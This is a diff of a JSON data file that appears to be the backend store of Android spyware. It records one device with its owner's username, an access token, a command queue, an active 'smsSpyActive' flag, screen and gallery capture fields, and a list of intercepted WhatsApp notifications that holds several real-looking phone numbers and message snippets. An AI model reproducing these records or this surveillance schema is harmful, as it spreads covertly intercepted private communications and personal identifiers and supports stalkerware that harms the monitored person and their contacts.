@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776002039684,
+    "lastSeen": 1776002043396,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎‎+62 823-9620-4103 & +62 852-4113-9999 (2 pesan): ‎+62 823-9620-4103 & +62 852-4113-9999",
+        "content": "Anda ditambahkan",
+        "time": "12/04 20:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002043749
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎+62 823-9620-4103 & +62 852-4113-9999",
+        "content": "‎2 pesan baru",
+        "time": "12/04 20:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002043731
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-9620-4103",
+        "content": "Anda ditambahkan",
+        "time": "12/04 20:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776002043046
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 823-9620-4103: +62 823-9620-4103",
@@ -4099,30 +4123,6 @@
         "time": "12/04 00:07",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927238185
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ kkdap catalyst/reality",
-        "content": "200000000000000",
-        "time": "12/04 00:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927235089
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2 pesan dari 2 chat",
-        "time": "12/04 00:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927235071
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋",
-        "content": "~ thinn: ga iso",
-        "time": "12/04 00:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927233220
       }
     ],
     "galleryPhotos": [],
